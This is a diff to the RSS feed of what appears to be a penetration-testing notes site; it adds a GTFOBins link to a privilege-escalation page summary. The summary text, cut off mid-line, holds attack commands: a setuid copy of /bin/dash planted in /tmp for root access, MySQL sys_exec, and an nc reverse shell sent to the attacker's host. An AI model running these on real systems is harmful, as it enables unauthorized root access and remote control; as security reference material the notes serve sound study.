@@ -36,7 +36,7 @@ MySQL # If MySQL is running as root, you can run commands sys_exec(&amp;#39;user
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/linux-systems/privilege-escalation/abusing_sudo_programs/</guid>
-      <description>Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ 
+      <description>Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ https://gtfobins.github.io/ 
 General Information # Get privileges for users sudo -l /bin/dash is the only shell to keep the sticky bit, so if you run as root (included cron, or services running as root): install -mode 4755 /bin/dash /tmp/sh Then you will have a /tmp/sh that gives any user who calls it root ! # Some payloads to overcome limited shells ssh user@$ip nc $localip 4444 -e /bin/sh python -c &amp;#39;import pty; pty.</description>
     </item>
     
